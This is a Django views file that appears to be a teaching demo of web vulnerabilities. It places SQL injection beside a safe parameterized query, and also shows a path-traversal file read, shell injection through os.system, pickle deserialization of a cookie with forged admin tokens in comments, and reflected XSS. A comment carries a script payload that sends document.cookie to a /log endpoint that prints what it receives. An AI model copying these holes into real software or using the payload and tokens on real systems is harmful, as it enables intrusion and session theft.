import json
import os
import pickle
from dataclasses import dataclass
import base64

from django.http import HttpResponse, JsonResponse

from security.models import User


def unsafe_users(request, user_id):
    users = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')

    return HttpResponse(users)


def safe_users(request, user_id):
    users = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id,))

    return HttpResponse(users)


def read_file(request, filename):
    with open(filename) as f:
        return HttpResponse(f.read())


def copy_file(request, filename):
    cmd = f'cp {filename} new_{filename}'

    os.system(cmd)

    return HttpResponse("All good, don't worry about a thing :>")


@dataclass
class TestUser:
    perms: int = 0

# No access token:
# 'gANjc2VjdXJpdHkudmlld3MKVXNlcgpxACmBcQF9cQJYBQAAAHBlcm1zcQNLAHNiLg=='
# b'\x80\x03csecurity.views\nUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x00sb.'

# Admin token:
# 'gANjc2VjdXJpdHkudmlld3MKVXNlcgpxACmBcQF9cQJYBQAAAHBlcm1zcQNLAXNiLg=='

def admin_index(request):
    token = base64.b64decode(request.COOKIES.get('silly_token', ''))

    user = pickle.loads(token)

    if user.perms == 1:
        return HttpResponse('Hello Admin')

    return HttpResponse('No access')


from django.utils.safestring import *
from django.utils.html import html_safe

# <script>new Image().src="http://127.0.0.1:8000/log?string="+document.cookie</script>
def search(request):
    query = mark_safe(request.GET.get('query', ''))

    response = HttpResponse(f"Query: {query}")

    # Override browser's protection, if exsits

    response['X-XSS-Protection'] = 0

    return response

def log(request):
    string = request.GET.get('string', '')

    print(string)

    return HttpResponse()
